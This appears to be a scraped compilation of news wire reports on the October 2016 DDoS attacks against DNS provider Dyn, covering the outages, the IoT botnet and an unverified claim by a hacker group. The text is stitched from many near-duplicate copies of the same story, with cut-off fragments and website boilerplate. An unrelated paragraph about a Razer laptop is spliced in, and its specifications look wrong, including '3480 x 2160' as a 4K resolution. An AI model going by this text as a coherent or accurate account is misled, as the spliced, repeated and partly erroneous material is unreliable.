which roughly 1 in 2 end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. “It’s been pretty busy for those guys,” Read said. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed.” Read said Dyn provides services to some 6 percent of America’s Fortune 500 companies. “It impacted quite a few users,” he said of the morning’s attack. A full list of affected companies wasn’t immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers claim responsibility Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter.

They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorldHacking Twitter account. They said 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China.

During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually. Secure your website and get better servers, otherwise be attacked again,” he said. Vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time.   Comments DentonRC.com is now using Facebook Comments.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities.

"I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. "The Internet of Things sort of ran way ahead of how the Internet was architected," Dyn's York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. "Prophet" of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. "We've stopped all our attacks," he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. ___ Satter reported from London, Bajak from Houston.

They are marketing the Blade Pro as a portable desktop replacement and although the device is notably thin at only .88 inches, it does weigh 7.8 lbs. The Blade Pro uses a 17.3-inch IGZO touchscreen with 4K (3480 x 2160) resolution that can cover 100% of Adobe’s RGB color space. The display also offers 170-degree viewing angles as well as support for NVIDIA's G-SYNC technology. The Blade Pro features NVIDIA’s GeForce GTX 1080 graphics card with 5 GB of GDDR5X VRAM, a 2.6 GHz Intel-i7 quad-core 6700-HQ processor and 32 GB of DDR4 RAM. All storage options utilize PCIe M.2 SSDs with up to a 2TB capacity. Razer says that these specs exceed the minimum hardware requirements to power the HTC Vive, Oculus Rift and OSVR HDK 2. The Blade Pro is powered by a built-in 99Wh battery and a compact 250W power adapter. Razer explains the device’s thermal management, stating "the vapor chamber reduces heat resistance and hotspots by spreading heat quickly, evenly and efficiently. A custom fan design and dynamic heat exchanger are paired with the vapor chamber to maximize heat dissipation." The device also features a low-profile and anti-ghosting mechanical keyboard with individually-lit keys powered by Razer Chroma and controlled by Razer's Synapse software. Other notable specs include three USB 3.0 ports, an SDXC card reader, a Thunderbolt 3 (USB-C) port and support for HDMI 2.0 audio and video input. The base model of the Blade Pro will retail for $3,699 from Razer's website with units shipping out later in November.

The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. HACKERS CLAIM RESPONSIBILITY Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually.. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," Kyle York, chief strategy officer of Dyn, on a call with reporters. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. ___ Most Read Find Local Real Estate Jobs Autos Businesses Find a job Buy or sell a car Find a place to live See what's for sale Find a business View obituaries N.J.

US internet repeatedly disrupted by cyberattacks on key firm Associated Press | LONDON (AP) — Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa.

World Breaking News Attack on US firm disrupts internet access Deutsche Presse AgenturOctober 22, 2016 1:57pm A cyber attack that downed popular internet sites including Twitter, Paypal, Netflix and Spotify - by targeting the service that allows users to connect to them - has been resolved, US-based DNS provider Dyn says, after hours of outages that spread around the world. The wave of several distributed denial of service (DDoS) attacks on Dyn began at 1110 GMT on Friday (8pm AEDT on Thursday). While the outages initially affected only the eastern United States, later users in Europe and Asia reported problems connecting to dozens of major websites. In a DDoS attack, systems are intentionally flooded with data to slow or stop legitimate users from accessing them. Dyn said it had not received any communication from the attackers and did not know who was responsible, CNBC reported. A senior US intelligence official told US broadcaster NBC that authorities do not believe the attack was state sponsored, instead identifying it as a case of "internet vandalism". Dyn told CNBC that Friday's attacks were "well planned and executed, coming from tens of millions of IP addresses at the same time". The attacks were carried out partly through the "internet of things" - physical devices like printers and appliances connected to the internet. The hijacked devices had been infected with malware, Dyn said, according to the report. Dyn's services are part of the infrastructure of the internet, directing users to its client websites. Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organised networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an Associated Press reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. The collective, named NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on December 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. Outages monitor downdetector.com on Saturday showed service back to normal on dozens of affected websites.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. "The Internet of Things sort of ran way ahead of how the Internet was architected," Dyn's York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. "Prophet" of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. "We've stopped all our attacks," he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. ___ Satter reported from London, Bajak from Houston.

The White House described the disruption as malicious. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe. Among the sites apparently affected were Twitter, Netflix, and Sony's PlayStation Network. The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. That means a lot of disruption. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but major sites including Twitter and coder hangout Github said they briefly experienced problems earlier Friday. For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn said in a series of statements that it first became aware of the attack around 7:00 a.m. local time and that services were restored about two hours later. A little more than two hours later, the company said it was working to mitigate another attack. A Dyn spokesman didn't respond to questions seeking further information about the online onslaught. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption.

HACKERS CLAIM RESPONSIBILITY Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually.. Secure your website and get better servers, otherwise be attacked again," he said.

(AP Photo/Elise Amendola, File) LONDON (AP) — Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn’t be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad Effects: The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as “twitter.com” into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. “It’s been pretty busy for those guys,” Read said. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed.” Read said Dyn provides services to some 6 percent of America’s Fortune 500 companies. “It impacted quite a few users,” he said of the morning’s attack. A full list of affected companies wasn’t immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers Claim Responsibility: Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn’t do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to be taking “good actions.” Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually.. Secure your website and get better servers, otherwise be attacked again,” he said. The Vulnerable Internet: For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn said in a series of statements that it first became aware of the attack around 7:00 a.m. local time and that services were restored about two hours later. A little more than two hours later, the company said it was working to mitigate another attack. A Dyn spokesman didn’t respond to questions seeking further information about the online onslaught. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said. ___ Bajak reported from Houston.

For many hours today, we were unable to post anything to pennlive.com. During the outage, stories were posted directly to PennLive's Facebook.

The attack had knock-on effects for users trying to access popular websites from across the United States, Canada and even in Europe.

Dyn said in a series of statements that it first became aware of the attack around 7:00 a.m. local time and that services were restored about two hours later.

Manchester, N.H.-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across the U.S. and even in Europe. Among the sites presumably affected were Twitter, Netflix and Sony's PlayStation Network. The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off global positioning systems before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company early Friday tracked a half-hour-long disruption in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West coasts as well as affecting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years, and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. That means a lot of disruption. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available. But major sites including Twitter and coder hangout Github said they briefly experienced problems. For James Norton, the former deputy secretary at the Department of Homeland Security and now an instructor in cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn said in a series of statements that it first became aware of the attack around 7:00 a.m. eastern time and that services were restored about two hours later. A little more than two hours later, the company said it was working to mitigate another attack. A Dyn spokesman didn't respond to questions seeking further information about the online onslaught. The Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters. He said he had no information about who may be behind the disruption.

The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn’t be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. “The complexity of the attacks is what is making it so difficult for us,” said Kyle York, the company’s chief strategy officer. “What they are actually doing is moving around the world with each attack.” He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as “twitter.com.” Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn’t matter that the store is fully open or operational if you have no idea how to get there,” he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. “We’ve been monitoring Dyn for years and this is by far the worst outage event that we’ve observed,” said Read. Dyn provides services to some 6 percent of America’s Fortune 500 companies, he said. A full list of affected companies wasn’t immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn’t do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to their actions were “good,” presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually. Secure your website and get better servers, otherwise be attacked again,” he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. “The Internet of Things sort of ran way ahead of how the Internet was architected,” Dyn’s York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. “It is a very smart attack. As we start to mitigate they react and start to throw something that’s over the top,” York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. “Prophet” of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. “We’ve stopped all our attacks,” he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled “Someone Is Learning How to Take Down the Internet,” respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said.

